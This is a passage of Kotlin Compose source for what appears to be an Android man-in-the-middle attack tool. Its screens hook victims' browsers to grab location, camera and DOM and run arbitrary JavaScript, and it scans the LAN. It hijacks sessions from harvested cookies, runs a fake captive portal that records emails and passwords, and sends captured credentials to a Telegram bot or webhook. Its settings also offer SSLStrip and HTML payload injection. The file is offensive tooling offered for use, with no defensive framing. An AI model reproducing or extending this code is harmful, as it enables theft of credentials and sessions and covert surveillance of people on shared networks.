                            HookCmd("Location", Icons.Filled.LocationOn, CgBlue) { onCommand(session.sessionId, "get_location", emptyMap()) }
                            HookCmd("Camera", Icons.Filled.Camera, CgRed) { onCommand(session.sessionId, "camera_snap", emptyMap()) }
                            HookCmd("DOM", Icons.Filled.Share, CgGray) { onCommand(session.sessionId, "get_dom", emptyMap()) }
                            HookCmd("Device Info", Icons.Filled.Info, CgPurple) { onCommand(session.sessionId, "get_device_info", emptyMap()) }
                            HookCmd("Port Scan", Icons.Filled.Search, CgOrange) { onCommand(session.sessionId, "port_scan", mapOf("targets" to listOf("192.168.1.1"))) }
                            HookCmd("LAN Probe", Icons.Filled.Search, CgOrange) { onCommand(session.sessionId, "lan_probe", mapOf("subnet" to "192.168.1")) }
                        }

                        Spacer(Modifier.height(10.dp))

                        // JS executor
                        Text("EXECUTE JAVASCRIPT", fontSize = 9.sp, color = CgGray, letterSpacing = 1.sp, modifier = Modifier.padding(bottom = 6.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            OutlinedTextField(value = jsInput, onValueChange = { jsInput = it },
                                placeholder = { Text("document.title", fontSize = 11.sp, color = CgGray) },
                                textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgGreen, fontFamily = FontFamily.Monospace),
                                modifier = Modifier.weight(1f).height(44.dp), singleLine = true, shape = RoundedCornerShape(10.dp),
                                colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                                    unfocusedBorderColor = CgGreen.copy(0.3f), focusedBorderColor = CgGreen))
                            Spacer(Modifier.width(6.dp))
                            FilledIconButton(onClick = {
                                onCommand(session.sessionId, "exec_js", mapOf("code" to jsInput.text))
                                jsInput = TextFieldValue("")
                            }, colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)),
                                modifier = Modifier.size(44.dp)) {
                                Icon(Icons.Filled.PlayArrow, contentDescription = null, tint = CgGreen, modifier = Modifier.size(20.dp))
                            }
                        }

                        // recent events
                        if (events.any { it.sessionId == session.sessionId }) {
                            Spacer(Modifier.height(10.dp))
                            Text("EVENTS", fontSize = 9.sp, color = CgGray, letterSpacing = 1.sp)
                            Spacer(Modifier.height(4.dp))
                            events.filter { it.sessionId == session.sessionId }.takeLast(5).reversed().forEach { event ->
                                Row(Modifier.padding(vertical = 2.dp), verticalAlignment = Alignment.CenterVertically) {
                                    Box(Modifier.size(6.dp).clip(CircleShape).background(CgDimGreen))
                                    Spacer(Modifier.width(6.dp))
                                    Text(event.type, fontSize = 10.sp, color = CgCyan, fontWeight = FontWeight.SemiBold, modifier = Modifier.width(90.dp))
                                    Text(event.data.entries.take(2).joinToString(", ") { "${it.key}=${it.value.toString().take(20)}" },
                                        fontSize = 9.sp, color = CgGray, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun HookCmd(label: String, icon: ImageVector, color: Color, onClick: () -> Unit) {
    Card(Modifier.clickable(onClick = onClick), colors = CardDefaults.cardColors(containerColor = color.copy(0.08f)),
        shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, color.copy(0.25f))) {
        Row(Modifier.padding(horizontal = 8.dp, vertical = 6.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(12.dp))
            Spacer(Modifier.width(4.dp))
            Text(label, fontSize = 10.sp, color = color, fontWeight = FontWeight.Medium)
        }
    }
}

// ============================
// NETWORK MAP
// ============================
@Composable
fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Column {
                    Text("Network Map", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
                    Text("${hosts.size} hosts discovered", fontSize = 12.sp, color = CgGray)
                }
                Button(onClick = onScan, enabled = !isScanning,
                    colors = ButtonDefaults.buttonColors(containerColor = CgCyan.copy(0.15f)),
                    shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgCyan.copy(0.5f))) {
                    if (isScanning) CircularProgressIndicator(modifier = Modifier.size(14.dp), color = CgCyan, strokeWidth = 2.dp)
                    else Icon(Icons.Filled.Search, contentDescription = null, tint = CgCyan, modifier = Modifier.size(14.dp))
                    Spacer(Modifier.width(6.dp))
                    Text(if (isScanning) "Scanning..." else "Scan Network", color = CgCyan, fontSize = 12.sp)
                }
            }
        }
        items(hosts) { host ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp),
                border = BorderStroke(1.dp, if (host.isGateway) CgGreen.copy(0.25f) else CgGray.copy(0.1f))) {
                Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(40.dp).clip(RoundedCornerShape(10.dp))
                        .background(if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.08f)), contentAlignment = Alignment.Center) {
                        Icon(if (host.isGateway) Icons.Filled.Router else Icons.Filled.Devices,
                            contentDescription = null, tint = if (host.isGateway) CgGreen else CgCyan, modifier = Modifier.size(20.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column(Modifier.weight(1f)) {
                        Text(host.hostname ?: host.ip, fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                        if (host.hostname != null) Text(host.ip, fontSize = 10.sp, color = CgGray)
                        host.mac?.let { Text(it, fontSize = 9.sp, color = CgGray.copy(0.5f)) }
                    }
                    Column(horizontalAlignment = Alignment.End) {
                        if (host.isGateway) Badge(containerColor = CgGreen.copy(0.2f)) { Text("GATEWAY", fontSize = 7.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp)) }
                        host.vendor?.let {
                            Spacer(Modifier.height(3.dp))
                            Badge(containerColor = CgCyan.copy(0.1f)) { Text(it.take(10), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp)) }
                        }
                    }
                }
            }
        }
    }
}

// ============================
// STATS
// ============================
@Composable
fun StatsScreen(stats: TrafficStats) {
    val topDomains = remember(stats.totalPackets.get()) { stats.topDomains() }
    val bwHistory by stats.bandwidthHistory.collectAsState()
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { Text("Traffic Analytics", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite) }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                GlowStatCard("Packets", "${stats.totalPackets.get()}", CgAmber, Icons.Filled.SwapVert, Modifier.weight(1f)) {}
                GlowStatCard("Traffic", formatBytes(stats.totalBytes.get()), CgBlue, Icons.Filled.DataUsage, Modifier.weight(1f)) {}
                GlowStatCard("Domains", "${topDomains.size}", CgPurple, Icons.Filled.Language, Modifier.weight(1f)) {}
            }
        }
        if (bwHistory.isNotEmpty()) {
            item {
                CgSection("Bandwidth (last 60s)") {
                    val maxBw = bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 1L
                    Row(Modifier.fillMaxWidth().height(80.dp), horizontalArrangement = Arrangement.spacedBy(2.dp), verticalAlignment = Alignment.Bottom) {
                        bwHistory.takeLast(30).forEach { pt ->
                            val h = if (maxBw > 0) (pt.bytesPerSecond.toFloat() / maxBw * 80).coerceIn(2f, 80f) else 2f
                            Box(Modifier.weight(1f).height(h.dp).clip(RoundedCornerShape(topStart = 2.dp, topEnd = 2.dp))
                                .background(Brush.verticalGradient(listOf(CgCyan, CgCyan.copy(0.3f)))))
                        }
                    }
                    Spacer(Modifier.height(6.dp))
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("Peak: ${formatBytes(bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 0)}/s", fontSize = 10.sp, color = CgCyan)
                        Text("Current: ${formatBytes(bwHistory.lastOrNull()?.bytesPerSecond ?: 0)}/s", fontSize = 10.sp, color = CgGray)
                    }
                }
            }
        }
        item {
            CgSection("Protocol Mix") {
                val total = stats.totalPackets.get().coerceAtLeast(1)
                ProtocolBar("HTTP", stats.protocol.httpCount, CgAmber, total)
                Spacer(Modifier.height(6.dp))
                ProtocolBar("HTTPS", stats.protocol.httpsCount, CgCyan, total)
                Spacer(Modifier.height(6.dp))
                ProtocolBar("DNS", stats.protocol.dnsCount, CgMagenta, total)
            }
        }
        item { CgSectionLabel("Top Domains") }
        items(topDomains) { domain ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(32.dp).clip(RoundedCornerShape(8.dp)).background(CgAmber.copy(0.1f)), contentAlignment = Alignment.Center) {
                        Icon(Icons.Filled.Language, contentDescription = null, tint = CgAmber, modifier = Modifier.size(16.dp))
                    }
                    Spacer(Modifier.width(10.dp))
                    Column(Modifier.weight(1f)) {
                        Text(domain.domain, fontSize = 12.sp, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        Text(formatBytes(domain.bytesTotal), fontSize = 10.sp, color = CgGray)
                    }
                    Column(horizontalAlignment = Alignment.End) {
                        Text("${domain.requestCount}", fontSize = 16.sp, fontWeight = FontWeight.Black, color = CgAmber)
                        Text("reqs", fontSize = 9.sp, color = CgGray)
                    }
                }
            }
        }
    }
}

@Composable
fun ProtocolBar(label: String, count: Long, color: Color, total: Long) {
    val fraction = (count.toFloat() / total.toFloat()).coerceIn(0f, 1f)
    Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
        Text(label, fontSize = 11.sp, color = CgGray, modifier = Modifier.width(52.dp))
        Box(Modifier.weight(1f).height(10.dp).clip(RoundedCornerShape(5.dp)).background(CgBg)) {
            Box(Modifier.fillMaxHeight().fillMaxWidth(fraction).clip(RoundedCornerShape(5.dp))
                .background(Brush.horizontalGradient(listOf(color, color.copy(0.5f)))))
        }
        Spacer(Modifier.width(8.dp))
        Text("$count", fontSize = 11.sp, color = color, modifier = Modifier.width(44.dp), textAlign = TextAlign.End)
    }
}

// ============================
// HIJACK
// ============================
@Composable
fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Unit, onRemove: (String) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Text("Session Hijacker", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
            Spacer(Modifier.height(4.dp))
            Text("Auto-populated from captured session cookies. Tap Hijack to open authenticated.", fontSize = 12.sp, color = CgGray, lineHeight = 16.sp)
        }
        if (sessions.isEmpty()) {
            item { EmptyState(Icons.Filled.Lock, "No sessions captured", "Cookie sessions auto-populate here from the credential harvester") }
        }
        items(sessions) { session ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard),
                shape = RoundedCornerShape(14.dp), border = BorderStroke(1.dp, CgRed.copy(0.25f))) {
                Column(Modifier.padding(14.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Box(Modifier.size(38.dp).clip(RoundedCornerShape(10.dp)).background(CgRed.copy(0.12f)), contentAlignment = Alignment.Center) {
                                Icon(Icons.Filled.Lock, contentDescription = null, tint = CgRed, modifier = Modifier.size(18.dp))
                            }
                            Spacer(Modifier.width(10.dp))
                            Column {
                                Text(session.label, fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                                Text("From: ${session.sourceIp}", fontSize = 10.sp, color = CgGray)
                            }
                        }
                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Button(onClick = { onHijack(session) },
                                colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)),
                                shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
                                Icon(Icons.Filled.Launch, contentDescription = null, tint = CgRed, modifier = Modifier.size(14.dp))
                                Spacer(Modifier.width(4.dp))
                                Text("Hijack", color = CgRed, fontSize = 11.sp)
                            }
                            IconButton(onClick = { onRemove(session.id) }, modifier = Modifier.size(36.dp)) {
                                Icon(Icons.Filled.Delete, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                            }
                        }
                    }
                    Spacer(Modifier.height(8.dp))
                    Text(session.cookies.take(80) + if (session.cookies.length > 80) "…" else "",
                        fontSize = 9.sp, color = CgGray.copy(0.5f), fontFamily = FontFamily.Monospace, maxLines = 2)
                }
            }
        }
    }
}

// ============================
// CAPTIVE PORTAL
// ============================
@Composable
fun CaptiveScreen(config: CaptiveConfig, entries: List<CaptiveEntry>, onUpdateConfig: (CaptiveConfig) -> Unit) {
    var activeTab by remember { mutableStateOf(0) }
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(16.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("Captive Portal", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
            Badge(containerColor = if (config.enabled) CgGreen.copy(0.2f) else CgGray.copy(0.2f)) {
                Text(if (config.enabled) "ACTIVE" else "OFF", fontSize = 9.sp,
                    color = if (config.enabled) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 6.dp, vertical = 3.dp))
            }
        }
        TabRow(selectedTabIndex = activeTab, containerColor = CgSurface, contentColor = CgGreen) {
            Tab(selected = activeTab == 0, onClick = { activeTab = 0 }) { Text("Config", fontSize = 12.sp, modifier = Modifier.padding(vertical = 10.dp)) }
            Tab(selected = activeTab == 1, onClick = { activeTab = 1 }) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.padding(vertical = 10.dp)) {
                    Text("Captures", fontSize = 12.sp)
                    if (entries.isNotEmpty()) { Spacer(Modifier.width(4.dp)); Badge(containerColor = CgRed) { Text("${entries.size}", fontSize = 8.sp) } }
                }
            }
        }
        when (activeTab) {
            0 -> CaptiveConfigTab(config, onUpdateConfig)
            1 -> CaptiveCapturesTab(entries)
        }
    }
}

@Composable
fun CaptiveConfigTab(config: CaptiveConfig, onUpdate: (CaptiveConfig) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { ToggleRow("Enable Portal (port 8888)", config.enabled) { onUpdate(config.copy(enabled = it)) } }
        item { CaptiveField("Portal Title", config.title) { onUpdate(config.copy(title = it)) } }
        item { CaptiveField("Subtitle", config.subtitle) { onUpdate(config.copy(subtitle = it)) } }
        item { CaptiveField("Logo Text (2 chars)", config.logoText) { onUpdate(config.copy(logoText = it)) } }
        item { CaptiveField("Primary Color (#hex)", config.primaryColor) { onUpdate(config.copy(primaryColor = it)) } }
        item { ToggleRow("Require Email/Username", config.requireEmail) { onUpdate(config.copy(requireEmail = it)) } }
        item { ToggleRow("Require Password", config.requirePassword) { onUpdate(config.copy(requirePassword = it)) } }
        item { CaptiveField("Redirect URL", config.redirectUrl) { onUpdate(config.copy(redirectUrl = it)) } }
    }
}

@Composable
fun CaptiveField(label: String, value: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) },
        label = { Text(label, fontSize = 10.sp) },
        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
        modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(10.dp),
        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgCard, focusedContainerColor = CgCard,
            unfocusedBorderColor = CgGray.copy(0.25f), focusedBorderColor = CgAmber))
}

@Composable
fun CaptiveCapturesTab(entries: List<CaptiveEntry>) {
    if (entries.isEmpty()) { EmptyState(Icons.Filled.Wifi, "No visitors yet", "Enable the portal and connect targets"); return }
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        items(entries.reversed()) { entry ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp),
                border = BorderStroke(1.dp, if (entry.accepted) CgGreen.copy(0.2f) else CgGray.copy(0.1f))) {
                Column(Modifier.padding(14.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                        Text(entry.sourceIp, fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                        Badge(containerColor = if (entry.accepted) CgGreen.copy(0.2f) else CgGray.copy(0.2f)) {
                            Text(if (entry.accepted) "SUBMITTED" else "VISITED", fontSize = 8.sp,
                                color = if (entry.accepted) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 4.dp))
                        }
                    }
                    entry.username?.let {
                        Spacer(Modifier.height(6.dp))
                        CredRow("Email", it, CgCyan)
                    }
                    entry.password?.let { CredRow("Pass", it, CgRed) }
                    Text(entry.userAgent.take(55), fontSize = 9.sp, color = CgGray.copy(0.5f), maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.padding(top = 4.dp))
                }
            }
        }
    }
}

// ============================
// WEBSOCKET SCREEN
// ============================
@Composable
fun WebSocketScreen(frames: List<WebSocketFrame>) {
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(16.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("WebSocket Frames", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
            Badge(containerColor = CgPurple.copy(0.2f)) { Text("${frames.size}", fontSize = 12.sp, color = CgPurple, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)) }
        }
        if (frames.isEmpty()) {
            EmptyState(Icons.Filled.Power, "No WS frames captured", "WS frames appear after target sites use WebSocket connections")
        } else {
            LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
                items(frames.reversed()) { frame ->
                    val color = if (frame.direction.contains("CLIENT")) CgCyan else CgAmber
                    Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                        Row(Modifier.padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
                            Icon(if (frame.direction.contains("CLIENT")) Icons.Filled.ArrowUpward else Icons.Filled.ArrowDownward,
                                contentDescription = null, tint = color, modifier = Modifier.size(14.dp))
                            Spacer(Modifier.width(6.dp))
                            Column(Modifier.weight(1f)) {
                                Row {
                                    Text(frame.host, fontSize = 11.sp, color = color, fontWeight = FontWeight.SemiBold)
                                    Spacer(Modifier.width(6.dp))
                                    Badge(containerColor = color.copy(0.1f)) { Text(frame.opcode, fontSize = 8.sp, color = color, modifier = Modifier.padding(horizontal = 3.dp)) }
                                }
                                if (frame.payload.isNotEmpty()) {
                                    Text(frame.payload.take(100), fontSize = 10.sp, color = CgWhite.copy(0.7f), fontFamily = FontFamily.Monospace, maxLines = 2, overflow = TextOverflow.Ellipsis)
                                }
                            }
                            Text("${frame.payloadSize}B", fontSize = 10.sp, color = CgGray)
                        }
                    }
                }
            }
        }
    }
}

// ============================
// ALERTS SCREEN
// ============================
@Composable
fun AlertsScreen(config: AlertConfig, onUpdate: (AlertConfig) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item {
            Text("Live Alerts", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
            Text("Get notified instantly when credentials are captured", fontSize = 12.sp, color = CgGray)
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, CgBlue.copy(0.2f)), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Send, contentDescription = null, tint = CgBlue, modifier = Modifier.size(20.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("Telegram Bot", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                        Spacer(Modifier.weight(1f))
                        Switch(checked = config.telegramEnabled, onCheckedChange = { onUpdate(config.copy(telegramEnabled = it)) },
                            colors = SwitchDefaults.colors(checkedTrackColor = CgGreen))
                    }
                    Spacer(Modifier.height(12.dp))
                    AlertField("Bot Token", config.telegramBotToken, "1234567890:AAF...") { onUpdate(config.copy(telegramBotToken = it)) }
                    Spacer(Modifier.height(8.dp))
                    AlertField("Chat ID", config.telegramChatId, "-1001234567890") { onUpdate(config.copy(telegramChatId = it)) }
                    Spacer(Modifier.height(8.dp))
                    Text("Get your bot token from @BotFather on Telegram. Get your Chat ID from @userinfobot.", fontSize = 10.sp, color = CgGray, lineHeight = 14.sp)
                }
            }
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, CgPurple.copy(0.2f)), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Hub, contentDescription = null, tint = CgPurple, modifier = Modifier.size(20.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("Webhook", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                        Spacer(Modifier.weight(1f))
                        Switch(checked = config.webhookEnabled, onCheckedChange = { onUpdate(config.copy(webhookEnabled = it)) },
                            colors = SwitchDefaults.colors(checkedTrackColor = CgGreen))
                    }
                    Spacer(Modifier.height(12.dp))
                    AlertField("Webhook URL", config.webhookUrl, "https://hooks.slack.com/...") { onUpdate(config.copy(webhookUrl = it)) }
                    Spacer(Modifier.height(8.dp))
                    Text("POST JSON to any URL — Discord, Slack, n8n, your own server.", fontSize = 10.sp, color = CgGray)
                }
            }
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Text("Alert Triggers", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                    Spacer(Modifier.height(8.dp))
                    ToggleRow("Alert on credential captured", config.alertOnCredential) { onUpdate(config.copy(alertOnCredential = it)) }
                    ToggleRow("Alert on browser hooked", config.alertOnHook) { onUpdate(config.copy(alertOnHook = it)) }
                    ToggleRow("Alert on new device connected", config.alertOnDevice) { onUpdate(config.copy(alertOnDevice = it)) }
                }
            }
        }
    }
}

@Composable
fun AlertField(label: String, value: String, placeholder: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) },
        label = { Text(label, fontSize = 10.sp) },
        placeholder = { Text(placeholder, fontSize = 10.sp, color = CgGray.copy(0.5f)) },
        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite, fontFamily = FontFamily.Monospace),
        modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(10.dp),
        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
            unfocusedBorderColor = CgGray.copy(0.25f), focusedBorderColor = CgBlue))
}

// ============================
// SETTINGS
// ============================
@Composable
fun SettingsScreen(
    mode: InterceptMode, onModeChange: (InterceptMode) -> Unit,
    config: InjectionConfig, onConfigUpdate: (InjectionConfig) -> Unit,
    profiles: List<String>, onSaveProfile: (String) -> Unit,
    onLoadProfile: (String) -> Unit, onDeleteProfile: (String) -> Unit,
    onExportCa: () -> Unit, savedSessions: List<String>,
    onSaveSession: () -> Unit, onDeleteSession: (String) -> Unit,
    onShareSession: (String) -> Unit, autoStart: Boolean,
    onToggleAutoStart: (Boolean) -> Unit, navigateTo: (Screen) -> Unit
) {
    var profileName by remember { mutableStateOf(TextFieldValue("")) }
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item { Text("Settings", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite) }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Text("INTERCEPT MODE", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(10.dp))
                    InterceptMode.entries.forEach { m ->
                        Row(Modifier.fillMaxWidth().clickable { onModeChange(m) }.padding(vertical = 8.dp), verticalAlignment = Alignment.CenterVertically) {
                            RadioButton(selected = mode == m, onClick = { onModeChange(m) }, colors = RadioButtonDefaults.colors(selectedColor = CgGreen))
                            Spacer(Modifier.width(10.dp))
                            Column {
                                Text(m.name, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.SemiBold)
                                Text(when (m) {
                                    InterceptMode.PASSTHROUGH -> "Log everything silently"
                                    InterceptMode.AUTO_INJECT -> "Inject payloads into HTML responses"
                                    InterceptMode.MANUAL -> "Pause every packet for editing"
                                }, fontSize = 10.sp, color = CgGray)
                            }
                        }
                    }
                }
            }
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Text("INJECTION", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(10.dp))
                    ToggleRow("Browser Hook Agent", config.hookEnabled) { onConfigUpdate(config.copy(hookEnabled = it)) }
                    ToggleRow("SSLStrip", config.sslStripEnabled) { onConfigUpdate(config.copy(sslStripEnabled = it)) }
                    SettingsField("Audio URL", config.audioUrl ?: "") { onConfigUpdate(config.copy(audioUrl = it.ifBlank { null })) }
                    SettingsField("Video URL", config.videoUrl ?: "") { onConfigUpdate(config.copy(videoUrl = it.ifBlank { null })) }
                    SettingsField("Redirect URL", config.redirectUrl ?: "") { onConfigUpdate(config.copy(redirectUrl = it.ifBlank { null })) }
                    SettingsField("Custom JS", config.customJs ?: "") { onConfigUpdate(config.copy(customJs = it.ifBlank { null })) }
                }
            }
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Text("PROFILES", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(10.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        OutlinedTextField(value = profileName, onValueChange = { profileName = it },
                            placeholder = { Text("Profile name", fontSize = 11.sp) },
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
                            modifier = Modifier.weight(1f).height(44.dp), singleLine = true, shape = RoundedCornerShape(10.dp),
                            colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                                unfocusedBorderColor = CgGray.copy(0.25f), focusedBorderColor = CgGreen))
                        Spacer(Modifier.width(8.dp))
                        Button(onClick = { if (profileName.text.isNotBlank()) { onSaveProfile(profileName.text); profileName = TextFieldValue("") } },
                            colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(10.dp),
                            border = BorderStroke(1.dp, CgGreen.copy(0.5f)), contentPadding = PaddingValues(horizontal = 16.dp)) {
                            Text("Save", color = CgGreen, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Spacer(Modifier.height(8.dp))
                    profiles.forEach { name ->
                        Row(Modifier.fillMaxWidth().padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Filled.Folder, contentDescription = null, tint = CgAmber, modifier = Modifier.size(14.dp))
                            Spacer(Modifier.width(8.dp))
                            Text(name, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
                            TextButton(onClick = { onLoadProfile(name) }) { Text("Load", fontSize = 11.sp, color = CgCyan) }
                            TextButton(onClick = { onDeleteProfile(name) }) { Text("Del", fontSize = 11.sp, color = CgRed) }
                        }
                    }
                }
            }
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Text("SESSION SNAPSHOTS", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(10.dp))
                    Button(onClick = onSaveSession, modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = CgBlue.copy(0.15f)), shape = RoundedCornerShape(10.dp),
                        border = BorderStroke(1.dp, CgBlue.copy(0.4f))) {
                        Icon(Icons.Filled.Save, contentDescription = null, tint = CgBlue, modifier = Modifier.size(16.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("Save Current Session", color = CgBlue, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
